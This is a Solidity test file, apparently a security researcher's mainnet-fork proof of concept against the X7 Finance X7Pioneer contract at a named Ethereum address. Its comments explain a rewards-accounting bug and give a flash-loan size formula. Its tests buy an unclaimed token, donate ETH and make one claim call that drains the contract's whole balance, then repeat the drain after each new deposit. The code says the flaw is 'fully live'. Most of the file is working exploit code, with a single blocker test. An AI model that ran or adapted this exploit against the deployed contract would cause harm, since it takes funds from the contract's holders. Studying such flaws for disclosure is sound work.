// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Z3-H7 X7 Finance X7Pioneer (Ethereum) — re-arm-on-deposit verification.
//
// Bug: claimRewards() bumps `totalRewards` by (balance - lastETHBalance) on EVERY call, but only
// refreshes `lastETHBalance` inside the `claimable > 0` payout branch. Any ETH that lands in the
// contract (fee inflow / deposit / donation) creates an unaccounted delta that can be re-counted
// into totalRewards; since per-token rewards are totalRewards / totalSupply(), the owner of a
// single never-claimed token can then claim up to the WHOLE contract balance.
//
// A fresh attacker needs: (1) a tokenId with rewardsClaimed == 0 that they own, and (2) a flash
// loan of L ~= (totalRewards/totalSupply - balance) / (1 - 1/totalSupply) to keep the payout inside
// the balance. Net extraction = the contract's entire pre-existing balance B.
//
// Read-only on mainnet: fork only.

import {ForkEnv} from "../src/ForkEnv.sol";

interface IX7Pioneer {
    function claimRewards(uint256[] memory tokenIds) external;
    function totalRewards() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function lastETHBalance() external view returns (uint256);
    function rewardsClaimed(uint256 tokenId) external view returns (uint256);
    function ownerOf(uint256 tokenId) external view returns (address);
    function transferUnlocked(uint256 tokenId) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract X7RearmTest is ForkEnv {
    IX7Pioneer internal constant X7 = IX7Pioneer(0x70000299Ee8910cCaCD97B1bB560E34F49c9e4f7);

    // Unlocked (transferable) tokenIds with rewardsClaimed == 0 at block 26,201,5xx (verified live).
    // The helper picks the first that still qualifies at fork time.
    function _firstUnclaimed(uint256[] memory skip) internal view returns (uint256) {
        uint256[8] memory cands = [uint256(0), 10, 20, 22, 24, 30, 40, 42];
        for (uint256 i; i < cands.length; i++) {
            bool skipped;
            for (uint256 j; j < skip.length; j++) if (skip[j] == cands[i]) skipped = true;
            if (skipped) continue;
            if (X7.transferUnlocked(cands[i]) && X7.rewardsClaimed(cands[i]) == 0) return cands[i];
        }
        revert("no unlocked unclaimed token available");
    }

    uint256 internal donated; // flash-loan stand-in, repaid out of the payout

    function setUp() public {
        vm.createSelectFork(_rpc("FORK_RPC_URL", _rpc("RPC_URL", "https://ethereum-rpc.publicnode.com")));
    }

    receive() external payable {}

    function _drainWithToken(uint256 tokenId) internal returns (uint256 payout, uint256 net) {
        uint256 B = address(X7).balance;
        uint256 TR = X7.totalRewards();
        uint256 S = X7.totalSupply();
        uint256 ac = X7.rewardsClaimed(tokenId);
        uint256 last = X7.lastETHBalance();

        // Minimal loan so that the claim-call bump (balance + L - lastETHBalance) does not push the
        // payout above the balance: floor((TR + B + L - last)/S) - ac <= B + L.
        uint256 num = (TR - last) - ac * S - (S - 1) * B;
        uint256 L = num / (S - 1) + 1000;
        donated = L;

        // Simulate the market purchase of an unlocked token: the current owner transfers it to the
        // attacker (on-chain the token holder must unlock it first — 0.07 ETH — or it is already unlocked).
        address owner_ = X7.ownerOf(tokenId);
        assertTrue(X7.transferUnlocked(tokenId), "token must be transfer-unlocked to be acquirable");
        vm.prank(owner_);
        X7.transferFrom(owner_, address(this), tokenId);
        assertEq(X7.ownerOf(tokenId), address(this), "attacker owns the token");

        // Flash-loan stand-in: fund the donation.
        vm.deal(address(this), L);

        // Deposit (donation) into the pool -> creates the unaccounted delta the bug re-counts.
        (bool ok,) = address(X7).call{value: L}("");
        require(ok, "donation failed");

        // Single claim call: the bump runs on entry, then the token's reward is paid out.
        uint256 balBefore = address(this).balance;
        uint256[] memory ids = new uint256[](1);
        ids[0] = tokenId;
        X7.claimRewards(ids);
        payout = address(this).balance - balBefore;
        net = payout - L;

        // Repay the flash loan (stand-in lender).
        (bool repaid,) = address(uint160(uint256(keccak256("lender")))).call{value: L}("");
        // The lender is a fresh address; repayment always succeeds.
        require(repaid, "repay failed");
    }

    // ------------------------------------------------------------------------------------------
    // Today: the pool holds only 0.0216 ETH, but the primitive is fully live for any balance.
    // ------------------------------------------------------------------------------------------
    function test_X7_today_live_state_and_full_capture_of_balance() public {
        uint256 forkBlock = block.number;
        emit log_named_uint("fork block", forkBlock);

        uint256 B = address(X7).balance;
        emit log_named_decimal_uint("X7 balance (pre)", B, 18);
        emit log_named_decimal_uint("X7 lastETHBalance (pre)", X7.lastETHBalance(), 18);
        emit log_named_uint("X7 totalSupply", X7.totalSupply());
        assertEq(X7.lastETHBalance(), B, "no unaccounted delta today: balance == lastETHBalance");
        assertGt(B, 0, "pool holds dust");

        uint256[] memory none = new uint256[](0);
        uint256 tokenId = _firstUnclaimed(none);
        emit log_named_uint("token used (unlocked, never claimed)", tokenId);
        (uint256 payout, uint256 net) = _drainWithToken(tokenId);

        emit log_named_decimal_uint("payout to attacker", payout, 18);
        emit log_named_decimal_uint("loan donated", donated, 18);
        emit log_named_decimal_uint("NET captured (pool balance)", net, 18);
        emit log_named_decimal_uint("X7 balance (post)", address(X7).balance, 18);

        // The single claim sweeps the ENTIRE pre-existing pool balance.
        assertApproxEqAbs(net, B, 0.0002 ether, "net capture ~= whole pool balance B");
        assertLt(address(X7).balance, 1e12, "contract left empty (dust only)");
    }

    // ------------------------------------------------------------------------------------------
    // Re-arm: any new ETH arriving (deposit / fee inflow) is captured in full by the next cycle.
    // ------------------------------------------------------------------------------------------
    function test_X7_rearm_on_deposit_captures_new_balance() public {
        // cycle 1: drain the current 0.0216 ETH
        uint256[] memory none = new uint256[](0);
        uint256 t1 = _firstUnclaimed(none);
        (, uint256 net1) = _drainWithToken(t1);
        emit log_named_decimal_uint("cycle 1 net", net1, 18);

        // re-arm: a deposit / fee inflow of 0.5 ETH lands in the pool
        uint256 DEPOSIT = 0.5 ether;
        vm.deal(address(this), DEPOSIT);
        (bool ok,) = address(X7).call{value: DEPOSIT}("");
        require(ok, "deposit failed");
        emit log_named_decimal_uint("pool after new deposit", address(X7).balance, 18);

        // cycle 2: a second never-claimed unlocked token captures the new balance
        uint256[] memory used = new uint256[](1);
        used[0] = t1;
        uint256 t2 = _firstUnclaimed(used);
        emit log_named_uint("cycle 2 token used", t2);
        (uint256 payout2, uint256 net2) = _drainWithToken(t2);
        emit log_named_decimal_uint("cycle 2 payout", payout2, 18);
        emit log_named_decimal_uint("cycle 2 NET", net2, 18);

        assertApproxEqAbs(net2, DEPOSIT, 0.0002 ether, "net capture ~= the new deposit");
        assertLt(address(X7).balance, 1e12, "contract left empty again");
    }

    // ------------------------------------------------------------------------------------------
    // Blocker: without owning a token the drain is impossible (ownership-gated payout).
    // ------------------------------------------------------------------------------------------
    function test_X7_without_token_cannot_claim() public {
        address stranger = makeAddr("stranger");
        uint256[] memory ids = new uint256[](1);
        ids[0] = 300; // owned by the original attacker, not by the stranger
        vm.prank(stranger);
        vm.expectRevert();
        X7.claimRewards(ids);

        // Empty-array inflation calls are permissionless but pay nothing (claimable == 0).
        uint256 b0 = stranger.balance;
        vm.prank(stranger);
        X7.claimRewards(new uint256[](0));
        assertEq(stranger.balance, b0, "no payout without a token");
    }
}
